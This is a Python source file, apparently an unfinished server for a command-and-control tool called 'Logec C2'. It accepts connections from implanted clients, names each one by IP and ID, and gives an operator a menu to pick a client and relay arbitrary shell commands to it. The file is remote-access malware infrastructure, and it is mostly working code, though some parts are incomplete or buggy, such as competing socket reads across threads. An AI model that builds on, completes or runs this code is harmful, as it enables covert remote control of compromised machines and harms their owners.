## New Server Code

## Order: start socket, bind to address, and listen for connections. Each new
#connection needs to be in its own thread

import subprocess as sp
import socket
import threading
import time
import os

import random
#import imports
#import Modules.Linux.linux_info
#import Modules.Windows.windows_info


HEADER = 64
FORMAT = 'utf-8'



class s_sock:
    ##########
    ## Main Thread
    ##########
    
    def start_server(self, ip, port):
        
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ADDR = (ip,port)
        self.server.bind(self.ADDR)  
        
        self.server.listen()  
        
        self.clients = {}
        
        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
        while True:
            self.conn, addr = self.server.accept()
            ##print("~New Connection~")
            
            ## Getting client id from the client, and the IP address
            self.ip_address = self.conn.getpeername()[0]
            self.id = self.conn.recv(1024).decode()
            
            ## Creating the name in format of '127_0_0_1_QWERT' aka 'IP_ID'
            
            client_name = "client_" + self.ip_address.replace(".", "_") + "_" + self.id
            
            ## creating object intance
            client = s_perclient()

            # something dict
            self.clients[client_name] = client
            
            ''' THis is what the dict looks like, each "name" is pointing at a class object
            clients = {
                "client_192_168_0_1_1": <s_perclient object at 0x7fda883e4c70>,
                "client_192_168_0_2_1": <s_perclient object at 0x7fda883e4d00>,
                "client_192_168_0_2_2": <s_perclient object at 0x7fda883e4d90>
            }
            '''

            globals()[client_name] = client
            thread = threading.Thread(target=client.handle_client, args=(self.conn, self.ADDR))

            thread.start()                
            
    def client_interact(self):
        ## This will be returned to the client later
        print(" ===== Logec C2 Manual Shell +++++\n\n")
        
        print("\n\n========Current Clients========")
        for var_name in globals():
            if var_name.startswith("client_"):
                print(var_name)
        print("===============================\n\n")
        
        
        ## dict 
        client_name = input("Enter a client name to interact, or 'refresh': ")

        # get the corresponding instance from the clients dictionary and call its method
        if client_name in self.clients:
            client_instance = self.clients[client_name]
            
            while True:
                client_instance.local_decision_tree(input(f"Client (menu for options): [{self.ip_address}]: "))
        
        elif client_name.lower() == "refresh":
            os.system("clear")
            self.client_interact()
            
        else:
            print(f"{client_name} not found.")
    
    ##########
    ## In Sub Thread
    ##########
    
    ## Needs a rework, including seperating handle_client to just hanlde the connection, and 
    ## A  proper cliet_do tree. Rely on the instance to hold data when not using (aka self) instead
    ## of passing commands into decisions tree like handle client currenlty is
    
    ##TLDR: handle_client only handles client connections, call client_do for actually performing client actions
    
class s_perclient:
    
    ## Each thread runs this, which will handle the client appropriatly.
    def handle_client(self, conn, addr):
        ## Need to hash out a standard protocol too, like who sends what etc
        
        # Basic Protocol. If everything obides by these, it should all work
        '''
        0) First connection, client sends clientID
        0A) Server responds with ?? (maybe a confirmation)
        
        1) Client sends heartbeat/hello
        2) Server recieves heartbeat. 
        3) Server responds with job, if no job, client waits & closes the connection*
            3a) If job, client stops heartbeat while doing job, then falls back to heartbeat
            
        4) Once wait time is up, steps 1-4 repeat
        
        *If no response is received, client also waits & continues with the heartbeat
        
        Final:
        
        On fail, the client should drop back to heartbeats.
        
        On server fail... Restart the "start_server" function after releasing the connection?
        
        '''
        
        self.conn = conn
        self.addr = addr
        ## redundant of self.addr but easier to use
        self.ip = addr[0]
        self.port = addr[1]
        
        ##print(self.conn, self.addr)
        
        
        ##print(f"New Connection from {conn.getpeername()}")
        
        ## Listening for anythinf from the client
        while True:
            # Receive message from client
            received_msg = conn.recv(1024).decode()
            if not received_msg:
                # Client has closed the connection, exit the loop

                print("Conn Closed\n\n")
                break
            
            # Process the received message
            #self.decision_tree(received_msg)
            
        # Close the connection when the loop is over
        conn.close()
        
        ## class needs to die when done

    ## decision tree for remote/automated messages
    def remote_decision_tree(self, msg):
        print(f"CLIENT SAYS: {msg}")

        if msg == "heartbeat":
            print("SERVER ACTION: client_do()")
            self.client_do()
    
    
    ## decision tree for user/local commands, or from logec
    def local_decision_tree(self, raw_cmd):
        #print(f"USER SAYS: {cmd}")
        
        cmd = raw_cmd.lower()

        ## Keeping connected while a user is interacting
        self.current_job = "None"

        if cmd == "shell":
            print("SERVER ACTION: client_do()")
            self.current_job = "shell"
            self.client_do()
            
        elif cmd == "menu":
            print("Jobs: ||\n1)shell \n2)debug\n")
            
        elif cmd == "status":
            print("FAKE STATUS, may show 'waiting' in future showing its waiting")
            
        elif cmd == "debug":
            print(f"{self.addr}")
        
        else:
            print("Command not found")
        
    
    def client_do(self):        
        if self.current_job == "None":
            pass
        
        elif self.current_job == "wait":
            self.send_msg("wait")
            #here the client heartbeat timer resets & it waits
        
        elif self.current_job == "shell":
            ## Telling client that I want a shell
            print("DEBUG: client_do sending shell")
            self.send_msg("shell")
            
            while True:
                shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
                
                if shellcommand == "_exit":
                    print("placeholder exit")
                    #conn.close()
                    
                else:
                    print(self.send_msg(shellcommand))
            #else:
                #print("SHELL ERR")
        
        
    
    def send_msg(self, message):
        
        self.conn.send(message.encode())
        
        print(f"Message being sent: {message}")
        #print("waiting on recieve message")
        
        recieve_msg = self.conn.recv(1024).decode()
        
        return recieve_msg


if __name__ == "__main__":
    ## could listen on multiple ports with threading this whole thing
    SERV = s_sock()
    
    background_listen = threading.Thread(target=SERV.start_server, args=('0.0.0.0',8095))

    background_listen.start() 
    
    #SERV.start_server('0.0.0.0',8092)
    
    SERV.client_interact()

    
    '''while True:
        shellcommand = input("$: ")
        SERV.send_msg(shellcommand)'''